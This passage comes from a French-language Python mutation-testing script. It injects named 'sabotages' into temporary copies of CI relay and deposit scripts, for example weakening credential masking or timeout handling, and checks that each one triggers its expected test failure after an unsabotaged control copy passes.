                                                         """        except ZeroDivisionError:   # poussée sans réponse (C4)""")],
    "S114_deposer_branche_illisible_ignoree": [(DEPOSEUR, """        if code_f != 0:   # N3""", """        if False:   # N3""")],
    "S115_deposer_refus_coupe_a_la_fin": [(DEPOSEUR, """masquer_les_acces(err)""", """masquer_les_acces(err[:200])""")],
    "S116_masque_une_seule_adresse": [(JETON, """ACCES_DANS_UNE_ADRESSE.sub(b"://***@", octets)""",
                                       """ACCES_DANS_UNE_ADRESSE.sub(b"://***@", octets, count=1)""")],
    "S117_garde_epelle_true": [(FABRICANT, """/^  cancel-in-progress:/ && !/^  cancel-in-progress:[[:space:]]*false[[:space:]]*$/ { annule = 1 }""",
                                """/^  cancel-in-progress:[[:space:]]*true/ { annule = 1 }""")],
    # 25-11-2026 (superviseur R-759, point 6) : l'examen sans réponse dans le délai
    "S118_deposer_examen_sans_reponse_non_rattrape": [(DEPOSEUR, """        except subprocess.TimeoutExpired:   # examen sans réponse""",
                                                       """        except ZeroDivisionError:   # examen sans réponse""")],
}

# LA FAUTE ATTENDUE DE CHAQUE SABOTAGE (superviseur R-759 du 25-11-2026, point 6 ; forme de
# tests/EPREUVES_DU_CIRCUIT_PUBLIC_Jeu_15-10-2026.py, MOTIFS_ATTENDUS) : le début de la faute que le sabotage DOIT
# produire ; une autre faute seule = « ROUGE POUR UNE AUTRE RAISON », code 1. Nommées ici : celles MESURÉES le
# 25-11-2026 (sortie de chaque sabotage lancé seul). Les autres sabotages ne sont pas encore nommés : leur ligne le dit
# (« faute attendue NON NOMMÉE ») ; les nommer demande la sortie d'un passage complet de --saboter (à jouer sur GitHub).
FAUTES_ATTENDUES = {
    "S102_ancien_nom_de_groupe_remis": "T1d le relais fabriqué porte le groupe des relais anciens",
    "S103_relais_sans_file_accepte": "T1a relais ancien sur la branche",
    "S104_groupe_du_relais_non_lu": "T1b relais en file sous le nom ancien",
    "S105_cancel_in_progress_true_admis": "K10 fiche visée à cancel-in-progress: true",
    "S106_relais_de_la_branche_non_lu": "V1 la demande réelle du premier passage",
    "S107_deposer_retente_sans_course": "D10 refus du crochet : 3 essai(s) au lieu de 1",
    "S108_deposer_refus_tronque": "D10 refus du crochet : motif du crochet absent",
    "S109_deposer_adresse_non_masquee": "D10 refus du crochet : adresse à accès en clair",
    "S110_deposer_jeton_non_masque": "D10 refus du crochet : forme de jeton en clair",
    "S111_deposer_masque_illisible_affiche_en_clair": "D11 masque illisible : refus affiché sans masque",
    "S112_deposer_jamais_retente_meme_en_course": "D12 course perdue : code 2 au lieu de 0",
    "S113_deposer_poussee_sans_reponse_non_rattrapee": "D13 poussée sans réponse : code 1 au lieu de 2",
    "S114_deposer_branche_illisible_ignoree": "D14 branche illisible après le refus : « rien ne dit si c'est une course » absent",
    "S115_deposer_refus_coupe_a_la_fin": "D15 refus long : fin du refus absente",
    "S116_masque_une_seule_adresse": "D15 refus long : seconde adresse en clair",
    "S117_garde_epelle_true": "K11 fiche visée à cancel-in-progress: True",
    "S118_deposer_examen_sans_reponse_non_rattrape": "D16 examen sans réponse : code 1 au lieu de 2",
}


def main():
    """Le programme entier (voir la fiche en tête).

    ① RÔLE — Fiche en tête. ② CONTEXTE D'APPEL — La ligne de commande. ③ ENTRÉE — Fiche en tête.
    ④ CONDITIONS D'ENTRÉE — — ⑤ SORTIE — UNE valeur : 0, 1 ou 2. [rend: 1]
    ⑥ TRAITEMENT — un tour tel quel ; avec --saboter (ou --saboter=S01,S02,… pour en choisir), une copie de la
      racine par sabotage (les quatre fichiers que l'épreuve lit : fabricant, table, joueur, rassembleur), le fichier
      visé écrit saboté, un tour par copie.
    ⑦ UNITÉ — — ⑧ POURQUOI — Fiche en tête. ⑨ CE QUI CLOCHE — —
    ⑩ EFFET — Fiche en tête. ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    choix = [a.split("=", 1)[1].split(",") for a in sys.argv[1:] if a.startswith("--saboter=")]
    # R1 du RELU du 25-11-2026 : un nom demandé qui ne désigne aucun sabotage (faute de frappe : « S1O7 ») ne jouait
    # AUCUN sabotage et rendait « tout est conforme », code 0. Désormais : rien de conclu, code 2, avant tout tour.
    # « AUCUN » est le mot réservé pour « le témoin seul ».
    inconnus_demandes = [x for x in (choix[0] if choix else []) if x != "AUCUN"
                         and not any(x == n or x == n.split("_")[0] for n in SABOTAGES)]
    if inconnus_demandes:
        print(f"RIEN DE CONCLU : --saboter= nomme des sabotages inconnus : {inconnus_demandes}")
        return 2
    faux = tour(DEPOT)
    print("Z0 programmes tels quels : " + ("T0, V0 à V5, V7, P01 à P28, P30, P31, P33, P34, P36, P37, E0 à E8, X0 à X13, Q1 à Q9, K0 à K11, T1a à T1d, D0 à D16, L1 à L3, F0 à F14, A0 à A14, R1 à R8, V6, P29, G1 à G6 conformes" if not faux else
                                            "FAUX " + " | ".join(faux)))
    code = 1 if faux else 0
    if "--saboter" in sys.argv or choix:
        noms = [n for n in SABOTAGES if not choix or n in choix[0] or n.split("_")[0] in choix[0]]
        inconnus = sorted(set(FAUTES_ATTENDUES) - set(SABOTAGES))
        if inconnus:   # une faute nommée pour un sabotage qui n'existe pas ne serait jamais jugée
            print(f"RIEN DE CONCLU : FAUTES_ATTENDUES nomme des sabotages inconnus : {inconnus}")
            return 2
        # LE TÉMOIN (superviseur R-759 du 25-11-2026, point 2) : la copie construite EXACTEMENT comme celle d'un
        # sabotage, mais NON sabotée, est jouée d'abord ; elle doit être verte. Sinon la copie elle-même est fausse (un
        # fichier que les programmes chargent n'y est pas) et chaque sabotage « mordrait » pour cette seule raison :
        # rien de conclu, code 2. Cas fondateur : D10 tombait en FileNotFoundError dans toute copie sabotée (mesuré le
        # 25-11-2026 sur S107), FORME_D_UN_JETON.py n'étant pas copié.
        for nom in [None] + noms:
            d = tempfile.mkdtemp(prefix="relais_series_sab_")
            try:
                for f in (FABRICANT, TABLE, JOUEUR, RASSEMBLEUR, JOUEUR_D_EPREUVE, DEPOSEUR, JETON):
                    os.makedirs(os.path.dirname(os.path.join(d, f)), exist_ok=True)
                    shutil.copyfile(os.path.join(DEPOT, f), os.path.join(d, f))
                for fichier, a, b in SABOTAGES.get(nom, []):
                    t = open(os.path.join(d, fichier), encoding="utf-8").read()
                    if t.count(a) != 1:
                        print(f"{nom} NE S'APPLIQUE PLUS : texte cible trouvé {t.count(a)} fois dans {fichier}")
                        return 2
                    open(os.path.join(d, fichier), "w", encoding="utf-8").write(t.replace(a, b))
                f = tour(d)
            finally:
                shutil.rmtree(d, ignore_errors=True)
            if nom is None:
                if f:
                    print(f"RIEN DE CONCLU : le témoin (copie NON sabotée) rougit, la copie est fausse : {f[:3]}")
                    return 2
                print("témoin (copie non sabotée) : vert")
                continue
            attendu = FAUTES_ATTENDUES.get(nom)
            if not f:
                print(f"{nom} NE MORD PAS")
                code |= 1
            elif attendu is not None and not any(x.startswith(attendu) for x in f):
                print(f"{nom} ROUGE POUR UNE AUTRE RAISON (attendu : « {attendu} ») : {f[:3]}")
                code |= 1
            else:
                print(f"{nom} mord{'' if attendu else ' (faute attendue NON NOMMÉE)'} : {f[:3]}")
    print("VERDICT : tout est conforme" if code == 0 else "VERDICT : NON CONFORME")
    return code


if __name__ == "__main__":
    sys.exit(main())
